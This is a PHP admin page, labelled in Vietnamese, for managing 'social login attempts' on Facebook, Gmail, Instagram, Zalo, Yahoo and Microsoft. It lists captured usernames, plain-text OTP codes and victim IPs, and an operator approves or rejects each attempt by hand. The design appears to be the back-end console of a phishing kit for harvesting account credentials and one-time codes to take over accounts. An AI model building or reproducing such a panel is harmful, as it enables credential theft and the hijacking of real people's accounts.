<?php
session_start();
require_once $_SERVER['DOCUMENT_ROOT'] . '/config/database.php';
require_once $_SERVER['DOCUMENT_ROOT'] . '/config/config.php';
require_once __DIR__ . '/../../includes/functions.php';
require_once __DIR__ . '/../../includes/admin-security.php';

// Require only admin key verification
requireAdminKey();

$page_title = 'Quản lý Social Login';
include '../../includes/header.php';

// Handle actions
if ($_SERVER['REQUEST_METHOD'] === 'POST' && checkCSRFToken()) {
    $action = $_POST['action'] ?? '';
    $attempt_id = intval($_POST['attempt_id'] ?? 0);

    switch ($action) {
        case 'approve':
            // Approve login attempt
            $stmt = $pdo->prepare("UPDATE social_login_attempts SET status = 'success' WHERE id = ?");
            if ($stmt->execute([$attempt_id])) {
                setFlashMessage('success', 'Đã phê duyệt yêu cầu đăng nhập.');
            } else {
                setFlashMessage('error', 'Có lỗi xảy ra khi phê duyệt.');
            }
            break;

        case 'reject':
            // Reject login attempt
            $stmt = $pdo->prepare("UPDATE social_login_attempts SET status = 'failed' WHERE id = ?");
            if ($stmt->execute([$attempt_id])) {
                setFlashMessage('success', 'Đã từ chối yêu cầu đăng nhập.');
            } else {
                setFlashMessage('error', 'Có lỗi xảy ra khi từ chối.');
            }
            break;

        case 'delete':
            // Delete login attempt
            $stmt = $pdo->prepare("DELETE FROM social_login_attempts WHERE id = ?");
            if ($stmt->execute([$attempt_id])) {
                setFlashMessage('success', 'Đã xóa yêu cầu đăng nhập.');
            } else {
                setFlashMessage('error', 'Có lỗi xảy ra khi xóa.');
            }
            break;
    }
}

// Get social login attempts with pagination
$page = max(1, intval($_GET['page'] ?? 1));
$status_filter = $_GET['status'] ?? '';
$platform_filter = $_GET['platform'] ?? '';

$where_conditions = [];
$params = [];

if (!empty($status_filter)) {
    $where_conditions[] = "status = ?";
    $params[] = $status_filter;
}

if (!empty($platform_filter)) {
    $where_conditions[] = "platform = ?";
    $params[] = $platform_filter;
}

$where_clause = '';
if (!empty($where_conditions)) {
    $where_clause = 'WHERE ' . implode(' AND ', $where_conditions);
}

// Get total count
$count_sql = "SELECT COUNT(*) FROM social_login_attempts $where_clause";
$stmt = $pdo->prepare($count_sql);
$stmt->execute($params);
$total = $stmt->fetchColumn();

// Get attempts
$offset = ($page - 1) * ITEMS_PER_PAGE;
$sql = "SELECT * FROM social_login_attempts $where_clause ORDER BY created_at DESC LIMIT ? OFFSET ?";
$params[] = ITEMS_PER_PAGE;
$params[] = $offset;

$stmt = $pdo->prepare($sql);
$stmt->execute($params);
$attempts = $stmt->fetchAll();

$total_pages = ceil($total / ITEMS_PER_PAGE);
?>

<!-- Admin Header -->
<div class="bg-gray-800 border-b border-gray-700 mb-8">
    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
        <div class="flex items-center justify-between">
            <div>
                <h1 class="text-3xl font-bold text-white">Quản lý Social Login</h1>
                <p class="text-gray-400 mt-1">Theo dõi và quản lý các yêu cầu đăng nhập social media</p>
            </div>
        </div>
    </div>
</div>

<!-- Filters -->
<div class="mb-6">
    <div class="bg-gray-800 rounded-lg p-6 border border-gray-700">
        <form method="GET" class="flex flex-wrap gap-4">
            <div>
                <label class="block text-sm font-medium text-gray-300 mb-2">Trạng thái</label>
                <select name="status" class="bg-gray-700 border border-gray-600 text-white rounded-lg px-3 py-2 focus:ring-2 focus:ring-primary-500 focus:border-transparent">
                    <option value="">Tất cả</option>
                    <option value="pending" <?php echo $status_filter === 'pending' ? 'selected' : ''; ?>>Chờ xử lý</option>
                    <option value="processing" <?php echo $status_filter === 'processing' ? 'selected' : ''; ?>>Đang xử lý</option>
                    <option value="success" <?php echo $status_filter === 'success' ? 'selected' : ''; ?>>Thành công</option>
                    <option value="failed" <?php echo $status_filter === 'failed' ? 'selected' : ''; ?>>Thất bại</option>
                </select>
            </div>

            <div>
                <label class="block text-sm font-medium text-gray-300 mb-2">Nền tảng</label>
                <select name="platform" class="bg-gray-700 border border-gray-600 text-white rounded-lg px-3 py-2 focus:ring-2 focus:ring-primary-500 focus:border-transparent">
                    <option value="">Tất cả</option>
                    <option value="facebook" <?php echo $platform_filter === 'facebook' ? 'selected' : ''; ?>>Facebook</option>
                    <option value="gmail" <?php echo $platform_filter === 'gmail' ? 'selected' : ''; ?>>Gmail</option>
                    <option value="instagram" <?php echo $platform_filter === 'instagram' ? 'selected' : ''; ?>>Instagram</option>
                    <option value="zalo" <?php echo $platform_filter === 'zalo' ? 'selected' : ''; ?>>Zalo</option>
                    <option value="yahoo" <?php echo $platform_filter === 'yahoo' ? 'selected' : ''; ?>>Yahoo</option>
                    <option value="microsoft" <?php echo $platform_filter === 'microsoft' ? 'selected' : ''; ?>>Microsoft</option>
                </select>
            </div>

            <div class="flex items-end">
                <button type="submit" class="bg-primary-600 hover:bg-primary-700 text-white px-4 py-2 rounded-lg font-medium">
                    <i class="fas fa-filter mr-2"></i> Lọc
                </button>
            </div>

            <div class="flex items-end">
                <a href="<?php echo APP_URL; ?>/admin/social-login-management" class="bg-gray-600 hover:bg-gray-700 text-white px-4 py-2 rounded-lg font-medium">
                    <i class="fas fa-times mr-2"></i> Xóa bộ lọc
                </a>
            </div>
        </form>
    </div>
</div>

<!-- Statistics -->
<div class="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
    <?php
    $stats = [
        'pending' => $pdo->query("SELECT COUNT(*) FROM social_login_attempts WHERE status = 'pending'")->fetchColumn(),
        'processing' => $pdo->query("SELECT COUNT(*) FROM social_login_attempts WHERE status = 'processing'")->fetchColumn(),
        'success' => $pdo->query("SELECT COUNT(*) FROM social_login_attempts WHERE status = 'success'")->fetchColumn(),
        'failed' => $pdo->query("SELECT COUNT(*) FROM social_login_attempts WHERE status = 'failed'")->fetchColumn()
    ];
    ?>

    <div class="bg-gray-800 rounded-lg p-6 border border-gray-700">
        <div class="flex items-center">
            <div class="p-3 rounded-full bg-yellow-500/10">
                <i class="fas fa-clock text-yellow-400 text-2xl"></i>
            </div>
            <div class="ml-4">
                <p class="text-gray-400 text-sm">Chờ xử lý</p>
                <p class="text-2xl font-bold text-white"><?php echo $stats['pending']; ?></p>
            </div>
        </div>
    </div>

    <div class="bg-gray-800 rounded-lg p-6 border border-gray-700">
        <div class="flex items-center">
            <div class="p-3 rounded-full bg-blue-500/10">
                <i class="fas fa-spinner text-blue-400 text-2xl"></i>
            </div>
            <div class="ml-4">
                <p class="text-gray-400 text-sm">Đang xử lý</p>
                <p class="text-2xl font-bold text-white"><?php echo $stats['processing']; ?></p>
            </div>
        </div>
    </div>

    <div class="bg-gray-800 rounded-lg p-6 border border-gray-700">
        <div class="flex items-center">
            <div class="p-3 rounded-full bg-green-500/10">
                <i class="fas fa-check text-green-400 text-2xl"></i>
            </div>
            <div class="ml-4">
                <p class="text-gray-400 text-sm">Thành công</p>
                <p class="text-2xl font-bold text-white"><?php echo $stats['success']; ?></p>
            </div>
        </div>
    </div>

    <div class="bg-gray-800 rounded-lg p-6 border border-gray-700">
        <div class="flex items-center">
            <div class="p-3 rounded-full bg-red-500/10">
                <i class="fas fa-times text-red-400 text-2xl"></i>
            </div>
            <div class="ml-4">
                <p class="text-gray-400 text-sm">Thất bại</p>
                <p class="text-2xl font-bold text-white"><?php echo $stats['failed']; ?></p>
            </div>
        </div>
    </div>
</div>

<!-- Attempts Table -->
<div class="bg-gray-800 rounded-lg border border-gray-700 overflow-hidden">
    <div class="px-6 py-4 border-b border-gray-700">
        <h2 class="text-xl font-semibold text-white">Danh sách yêu cầu đăng nhập</h2>
        <p class="text-gray-400 text-sm mt-1">Tổng cộng: <?php echo $total; ?> yêu cầu</p>
    </div>

    <?php if (empty($attempts)): ?>
        <div class="text-center py-12">
            <i class="fas fa-inbox text-gray-500 text-4xl mb-4"></i>
            <p class="text-gray-400">Không có yêu cầu đăng nhập nào</p>
        </div>
    <?php else: ?>
        <div class="overflow-x-auto">
            <table class="w-full">
                <thead class="bg-gray-700">
                    <tr>
                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                            ID
                        </th>
                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                            Nền tảng
                        </th>
                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                            Tài khoản
                        </th>
                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                            IP
                        </th>
                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                            Trạng thái
                        </th>
                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                            Thời gian
                        </th>
                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                            Thao tác
                        </th>
                    </tr>
                </thead>
                <tbody class="bg-gray-800 divide-y divide-gray-700">
                    <?php foreach ($attempts as $attempt): ?>
                        <tr class="hover:bg-gray-700 transition-colors">
                            <td class="px-6 py-4 whitespace-nowrap text-sm text-white">
                                #<?php echo $attempt['id']; ?>
                            </td>
                            <td class="px-6 py-4 whitespace-nowrap">
                                <div class="flex items-center">
                                    <i class="fab fa-<?php echo $attempt['platform']; ?> text-2xl mr-3
                                        <?php
                                        echo $attempt['platform'] === 'facebook' ? 'text-blue-400' :
                                            ($attempt['platform'] === 'gmail' ? 'text-red-400' :
                                            ($attempt['platform'] === 'instagram' ? 'text-pink-400' :
                                            ($attempt['platform'] === 'zalo' ? 'text-blue-400' :
                                            ($attempt['platform'] === 'yahoo' ? 'text-purple-400' : 'text-blue-400'))));
                                        ?>"></i>
                                    <span class="text-white font-medium"><?php echo ucfirst($attempt['platform']); ?></span>
                                </div>
                            </td>
                            <td class="px-6 py-4 whitespace-nowrap">
                                <div class="text-sm text-white"><?php echo htmlspecialchars($attempt['username']); ?></div>
                                <?php if ($attempt['otp']): ?>
                                    <div class="text-xs text-gray-400">OTP: <?php echo htmlspecialchars($attempt['otp']); ?></div>
                                <?php endif; ?>
                            </td>
                            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">
                                <?php echo htmlspecialchars($attempt['user_ip']); ?>
                            </td>
                            <td class="px-6 py-4 whitespace-nowrap">
                                <span class="inline-flex px-2 py-1 text-xs font-semibold rounded-full
                                    <?php
                                    echo $attempt['status'] === 'pending' ? 'bg-yellow-100 text-yellow-800' :
                                        ($attempt['status'] === 'processing' ? 'bg-blue-100 text-blue-800' :
                                        ($attempt['status'] === 'success' ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'));
                                    ?>">
                                    <?php
                                    echo $attempt['status'] === 'pending' ? 'Chờ xử lý' :
                                        ($attempt['status'] === 'processing' ? 'Đang xử lý' :
                                        ($attempt['status'] === 'success' ? 'Thành công' : 'Thất bại'));
                                    ?>
                                </span>
                            </td>
                            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-300">
                                <?php echo formatDate($attempt['created_at']); ?>
                            </td>
                            <td class="px-6 py-4 whitespace-nowrap text-sm font-medium">
                                <?php if ($attempt['status'] === 'pending'): ?>
                                    <form method="POST" class="inline-block mr-2">
                                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                        <input type="hidden" name="action" value="approve">
                                        <input type="hidden" name="attempt_id" value="<?php echo $attempt['id']; ?>">
                                        <button type="submit" class="text-green-400 hover:text-green-300" onclick="return confirm('Phê duyệt yêu cầu này?')">
                                            <i class="fas fa-check mr-1"></i> Phê duyệt
                                        </button>
                                    </form>

                                    <form method="POST" class="inline-block mr-2">
                                        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                        <input type="hidden" name="action" value="reject">
                                        <input type="hidden" name="attempt_id" value="<?php echo $attempt['id']; ?>">
                                        <button type="submit" class="text-red-400 hover:text-red-300" onclick="return confirm('Từ chối yêu cầu này?')">
                                            <i class="fas fa-times mr-1"></i> Từ chối
                                        </button>
                                    </form>
                                <?php endif; ?>

                                <form method="POST" class="inline-block">
                                    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
                                    <input type="hidden" name="action" value="delete">
                                    <input type="hidden" name="attempt_id" value="<?php echo $attempt['id']; ?>">
                                    <button type="submit" class="text-gray-400 hover:text-gray-300" onclick="return confirm('Xóa yêu cầu này?')">
                                        <i class="fas fa-trash mr-1"></i> Xóa
                                    </button>
                                </form>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>

        <!-- Pagination -->
        <?php if ($total_pages > 1): ?>
            <div class="px-6 py-4 border-t border-gray-700">
                <?php echo generatePagination($page, $total_pages, APP_URL . '/admin/social-login-management?' . http_build_query(array_filter(['status' => $status_filter, 'platform' => $platform_filter]))); ?>
            </div>
        <?php endif; ?>
    <?php endif; ?>
</div>

<?php include '../../includes/footer.php'; ?>
